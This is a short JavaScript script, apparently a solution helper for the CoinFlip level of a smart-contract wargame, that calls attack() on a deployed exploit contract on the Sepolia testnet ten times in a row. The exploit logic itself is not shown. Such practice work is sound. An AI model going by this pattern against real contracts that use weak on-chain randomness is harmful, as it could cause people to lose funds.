const { ethers } = require("ethers");
const abi = require("../../artifacts/contracts/3-coin-flip/CoinFlipAttack.sol/CoinFlipAttack.json").abi;
require("dotenv").config();

const COIN_FLIP_ATTACK_ADDRESS = "0x65f180c419a2177BeC3Da627351deADbb37709f4";

coinFlipAttack = async () => {
    const provider = new ethers.JsonRpcProvider(`https://eth-sepolia.g.alchemy.com/v2/${process.env.ALCHEMY_KEY}`);
    const wallet = new ethers.Wallet(process.env.METAMASK_KEY, provider);
    const coinFlipAttackContract = new ethers.Contract(COIN_FLIP_ATTACK_ADDRESS, abi, wallet);
    for (let i = 0; i < 10; i++) {
        const tx = await coinFlipAttackContract.attack({
            gasLimit: 3000000,
            gasPrice: ethers.parseUnits("5", "gwei")
        });
        await tx.wait();
    }
}

coinFlipAttack();